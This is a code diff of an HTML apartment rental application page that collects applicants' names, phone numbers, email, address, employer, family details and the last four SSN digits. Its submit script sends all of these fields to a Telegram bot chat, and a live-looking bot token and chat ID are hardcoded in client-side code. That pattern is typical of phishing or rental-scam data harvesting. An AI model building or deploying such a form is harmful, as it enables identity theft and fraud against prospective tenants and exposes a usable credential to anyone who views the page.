@@ -2,313 +2,269 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Apartment Application Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: url('https://images.unsplash.com/photo-1502673530728-f79b4cab31b1') no-repeat center center fixed;
+      background: url('https://images.unsplash.com/photo-1560184897-35c0f642d0aa?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed;
       background-size: cover;
       margin: 0;
       padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      max-width: 900px;
-      margin: 30px auto;
-      padding: 30px;
+    .form-container {
+      background: rgba(255, 255, 255, 0.97);
+      padding: 25px;
       border-radius: 12px;
-      box-shadow: 0px 4px 12px rgba(0,0,0,0.2);
+      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 800px;
+      margin: 30px;
     }
     h1 {
       text-align: center;
-      margin-bottom: 20px;
       color: #2c3e50;
+      margin-bottom: 20px;
     }
     label {
       font-weight: bold;
-      margin-top: 15px;
       display: block;
+      margin-top: 12px;
       color: #333;
     }
-    input, select, textarea {
+    input, select {
       width: 100%;
       padding: 10px;
       margin-top: 5px;
-      border-radius: 6px;
       border: 1px solid #ccc;
-      font-size: 14px;
-    }
-    .inline {
-      display: flex;
-      gap: 15px;
-    }
-    button {
-      background: #2c3e50;
-      color: #fff;
-      border: none;
-      padding: 12px 20px;
-      font-size: 16px;
       border-radius: 6px;
-      cursor: pointer;
-      margin-top: 20px;
+      font-size: 15px;
     }
-    button:hover {
-      background: #1a242f;
+    .inline-group {
+      display: flex;
+      gap: 10px;
+    }
+    .inline-group > div {
+      flex: 1;
     }
     .hidden {
       display: none;
     }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 14px;
+      background: #3498db;
+      border: none;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #2c81ba;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Apartment Application Form</h1>
+  <div class="form-container">
+    <h1>Apartment Application</h1>
     <form id="applicationForm">
       
-      <!-- Personal Information -->
-      <h2>Personal Information</h2>
-      <label>Type of Applicant:</label>
-      <select name="applicant_type" required>
-        <option value="">Select...</option>
-        <option value="Tenant">Tenant</option>
-        <option value="Guarantor">Guarantor</option>
-      </select>
+      <!-- Personal Info -->
+      <label>Full Name:</label>
+      <input type="text" name="full_name" required>
 
-      <label>If Guarantor, prospective tenant & relation:</label>
-      <input type="text" name="guarantor_relation" placeholder="Name & relation">
+      <label>Email Address:</label>
+      <input type="email" name="email" placeholder="example@email.com" required>
 
-      <label>Name:</label>
-      <input type="text" name="name" required>
-
-      <label>Date of Birth:</label>
-      <input type="date" name="dob" required>
-
-      <label>Mobile Phone:</label>
-      <input type="text" name="mobile_phone" required>
-
-      <label>Last 4 of SSN:</label>
-      <input type="text" name="ssn_last4" maxlength="4">
-
-      <label>Email Address (For Online Rent Payments):</label>
-      <input type="email" name="email" required>
-
-      <!-- Rental History -->
-      <h2>Applicant’s Rental History</h2>
-      <label>Current Address:</label>
-      <input type="text" name="current_address" required>
-
-      <div class="inline">
-        <div style="flex:1;">
-          <label>Apt #:</label>
-          <input type="text" name="apt_number">
+      <div class="inline-group">
+        <div>
+          <label>Home Phone:</label>
+          <input type="tel" name="home_phone" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>
         </div>
-        <div style="flex:1;">
-          <label>City:</label>
-          <input type="text" name="city" required>
-        </div>
-        <div style="flex:1;">
-          <label>State:</label>
-          <select name="state" required>
-            <option value="">Select State...</option>
-            <option value="AL">Alabama</option>
-            <option value="AK">Alaska</option>
-            <option value="AZ">Arizona</option>
-            <option value="AR">Arkansas</option>
-            <option value="CA">California</option>
-            <option value="CO">Colorado</option>
-            <option value="CT">Connecticut</option>
-            <option value="DE">Delaware</option>
-            <option value="FL">Florida</option>
-            <option value="GA">Georgia</option>
-            <option value="HI">Hawaii</option>
-            <option value="ID">Idaho</option>
-            <option value="IL">Illinois</option>
-            <option value="IN">Indiana</option>
-            <option value="IA">Iowa</option>
-            <option value="KS">Kansas</option>
-            <option value="KY">Kentucky</option>
-            <option value="LA">Louisiana</option>
-            <option value="ME">Maine</option>
-            <option value="MD">Maryland</option>
-            <option value="MA">Massachusetts</option>
-            <option value="MI">Michigan</option>
-            <option value="MN">Minnesota</option>
-            <option value="MS">Mississippi</option>
-            <option value="MO">Missouri</option>
-            <option value="MT">Montana</option>
-            <option value="NE">Nebraska</option>
-            <option value="NV">Nevada</option>
-            <option value="NH">New Hampshire</option>
-            <option value="NJ">New Jersey</option>
-            <option value="NM">New Mexico</option>
-            <option value="NY">New York</option>
-            <option value="NC">North Carolina</option>
-            <option value="ND">North Dakota</option>
-            <option value="OH">Ohio</option>
-            <option value="OK">Oklahoma</option>
-            <option value="OR">Oregon</option>
-            <option value="PA">Pennsylvania</option>
-            <option value="RI">Rhode Island</option>
-            <option value="SC">South Carolina</option>
-            <option value="SD">South Dakota</option>
-            <option value="TN">Tennessee</option>
-            <option value="TX">Texas</option>
-            <option value="UT">Utah</option>
-            <option value="VT">Vermont</option>
-            <option value="VA">Virginia</option>
-            <option value="WA">Washington</option>
-            <option value="WV">West Virginia</option>
-            <option value="WI">Wisconsin</option>
-            <option value="WY">Wyoming</option>
-          </select>
-        </div>
-        <div style="flex:1;">
-          <label>Zip:</label>
-          <input type="text" name="zip" required>
+        <div>
+          <label>Mobile Phone:</label>
+          <input type="tel" name="mobile_phone" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>
         </div>
       </div>
 
-      <label>Landlord/Mgmt. Co.:</label>
-      <input type="text" name="landlord">
+      <label>Last 4 of SSN:</label>
+      <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" placeholder="1234" required>
 
-      <label>Landlord’s Phone:</label>
-      <input type="text" name="landlord_phone">
+      <label>Current Address:</label>
+      <input type="text" name="street_address" placeholder="Street Address" required>
+      
+      <div class="inline-group">
+        <div>
+          <label>City:</label>
+          <input type="text" name="city" required>
+        </div>
+        <div>
+          <label>State:</label>
+          <select name="state" required>
+            <option value="">Select State</option>
+            <option>Alabama</option>
+            <option>Alaska</option>
+            <option>Arizona</option>
+            <option>Arkansas</option>
+            <option>California</option>
+            <option>Colorado</option>
+            <option>Connecticut</option>
+            <option>Delaware</option>
+            <option>Florida</option>
+            <option>Georgia</option>
+            <option>Hawaii</option>
+            <option>Idaho</option>
+            <option>Illinois</option>
+            <option>Indiana</option>
+            <option>Iowa</option>
+            <option>Kansas</option>
+            <option>Kentucky</option>
+            <option>Louisiana</option>
+            <option>Maine</option>
+            <option>Maryland</option>
+            <option>Massachusetts</option>
+            <option>Michigan</option>
+            <option>Minnesota</option>
+            <option>Mississippi</option>
+            <option>Missouri</option>
+            <option>Montana</option>
+            <option>Nebraska</option>
+            <option>Nevada</option>
+            <option>New Hampshire</option>
+            <option>New Jersey</option>
+            <option>New Mexico</option>
+            <option>New York</option>
+            <option>North Carolina</option>
+            <option>North Dakota</option>
+            <option>Ohio</option>
+            <option>Oklahoma</option>
+            <option>Oregon</option>
+            <option>Pennsylvania</option>
+            <option>Rhode Island</option>
+            <option>South Carolina</option>
+            <option>South Dakota</option>
+            <option>Tennessee</option>
+            <option>Texas</option>
+            <option>Utah</option>
+            <option>Vermont</option>
+            <option>Virginia</option>
+            <option>Washington</option>
+            <option>West Virginia</option>
+            <option>Wisconsin</option>
+            <option>Wyoming</option>
+          </select>
+        </div>
+      </div>
 
-      <label>Dates: From - To</label>
-      <input type="text" name="rental_dates" placeholder="MM/DD/YYYY - MM/DD/YYYY">
+      <label>Why are you leaving your current address?</label>
+      <input type="text" name="reason_leaving">
 
-      <label>Rent Amount:</label>
-      <input type="text" name="rent">
-
-      <label>Reason for Moving:</label>
-      <input type="text" name="reason_moving">
+      <label>When are you ready to move in?</label>
+      <input type="date" name="move_in_date">
 
       <!-- Employment -->
-      <h2>Applicant’s Employment History</h2>
-      <label>Current Employer:</label>
-      <input type="text" name="employer">
-
-      <label>Occupation/Position:</label>
-      <input type="text" name="position">
-
-      <label>Income:</label>
-      <input type="text" name="income">
+      <h3>Employment</h3>
+      <label>Employer Name:</label>
+      <input type="text" name="employer_name" required>
 
       <label>Pay Frequency:</label>
       <select name="pay_frequency" required>
-        <option value="">Select...</option>
-        <option value="Weekly">Weekly</option>
-        <option value="Bi-Weekly">Bi-Weekly</option>
-        <option value="Monthly">Monthly</option>
+        <option value="">Select</option>
+        <option>Weekly</option>
+        <option>Bi-Weekly</option>
+        <option>Monthly</option>
       </select>
 
-      <!-- Additional Questions -->
-      <h2>Additional Information</h2>
+      <!-- Family & Lifestyle -->
+      <h3>Additional Information</h3>
+
       <label>Are you married?</label>
       <select name="married" required>
-        <option value="">Select...</option>
-        <option value="yes">Yes</option>
-        <option value="no">No</option>
+        <option value="">Select</option>
+        <option>Yes</option>
+        <option>No</option>
       </select>
 
       <label>Do you have kids?</label>
-      <select name="kids" id="kids" required>
-        <option value="">Select...</option>
-        <option value="yes">Yes</option>
-        <option value="no">No</option>
+      <select id="kids" name="kids" required>
+        <option value="">Select</option>
+        <option>Yes</option>
+        <option>No</option>
       </select>
-      <div id="kids_number_div" class="hidden">
-        <label>How many kids?</label>
-        <input type="number" name="kids_number" min="1">
+
+      <div id="kids_count_field" class="hidden">
+        <label>If yes, how many kids?</label>
+        <input type="number" name="kids_count" min="1" max="10">
       </div>
 
       <label>Do you have a car?</label>
       <select name="car" required>
-        <option value="">Select...</option>
-        <option value="yes">Yes</option>
-        <option value="no">No</option>
+        <option value="">Select</option>
+        <option>Yes</option>
+        <option>No</option>
       </select>
 
       <label>Do you have a pet?</label>
-      <select name="pet" id="pet" required>
-        <option value="">Select...</option>
-        <option value="yes">Yes</option>
-        <option value="no">No</option>
+      <select name="pet" required>
+        <option value="">Select</option>
+        <option>Yes</option>
+        <option>No</option>
       </select>
-      <div id="pet_type_div" class="hidden">
-        <label>What type of pet?</label>
-        <input type="text" name="pet_type">
-      </div>
 
       <label>How long lease are you looking for?</label>
-      <div class="inline">
-        <input type="number" name="lease_months" min="0" placeholder="Months">
-        <input type="number" name="lease_years" min="0" placeholder="Years">
-      </div>
+      <input type="text" name="lease_length" placeholder="e.g. 12 Months or 2 Years">
 
-      <label>Are you ready to secure the apartment with security deposit?</label>
-      <select name="deposit" required>
-        <option value="">Select...</option>
-        <option value="yes">Yes</option>
-        <option value="no">No</option>
+      <label>Are you ready to secure the apartment with a security deposit?</label>
+      <select name="security_deposit" required>
+        <option value="">Select</option>
+        <option>Yes</option>
+        <option>No</option>
       </select>
 
-      <label>When are you ready to move in?</label>
-      <input type="date" name="move_in">
-
       <!-- Authorization -->
-      <h2>Authorization</h2>
+      <h3>Authorization</h3>
       <p>
-        I hereby authorize the Landlord or Rental Agent to obtain information it deems desirable in the processing of my application,
-        including credit reports, civil or criminal actions, rental history, employment/salary details, and any other relevant information.
-        This application releases the Landlord, its employees and agents, from all liabilities and damage whatsoever incurred in furnishing
-        and obtaining such information.
-        <br>*Credit check fee: $50.00 per applicant
+        I declare that the information provided is true and correct. I authorize verification of my application.
       </p>
-      <label>
-        <input type="checkbox" name="authorization" required> I agree to the above statement
-      </label>
+      <input type="checkbox" name="authorization" required> I agree
 
       <button type="submit">Submit Application</button>
     </form>
   </div>
 
   <script>
-    // Kids logic
-    document.getElementById("kids").addEventListener("change", function() {
-      const kidsDiv = document.getElementById("kids_number_div");
-      kidsDiv.style.display = (this.value === "yes") ? "block" : "none";
+    // Show kids count if "Yes"
+    document.getElementById("kids").addEventListener("change", function () {
+      document.getElementById("kids_count_field").style.display = this.value === "Yes" ? "block" : "none";
     });
 
-    // Pet logic
-    document.getElementById("pet").addEventListener("change", function() {
-      const petDiv = document.getElementById("pet_type_div");
-      petDiv.style.display = (this.value === "yes") ? "block" : "none";
-    });
-
-    // Submit form to Telegram
-    document.getElementById("applicationForm").addEventListener("submit", function(e) {
+    // Telegram Bot Integration
+    document.getElementById("applicationForm").addEventListener("submit", function(e){
       e.preventDefault();
       const data = new FormData(this);
-      let text = "🏠 *New Apartment Application* 🏠\n\n";
-      data.forEach((value, key) => {
-        text += `*${key}*: ${value}\n`;
-      });
+      let message = "📄 *New Apartment Application Submitted:*\n\n";
+      for (const [key, value] of data.entries()) {
+        message += `*${key}:* ${value}\n`;
+      }
 
-      const token = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc"; // replace with your bot token
-      const chatId = "5590862324"; // replace with your chat id
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
-      }).then(res => {
-        if (res.ok) {
-          alert("Application submitted successfully!");
-          document.getElementById("applicationForm").reset();
-        } else {
-          alert("Error submitting application.");
-        }
-      });
+        body: JSON.stringify({
+          chat_id: "5590862324",
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(res => alert("✅ Application submitted successfully!"))
+        .catch(err => alert("❌ Error submitting application."));
     });
   </script>
 </body>
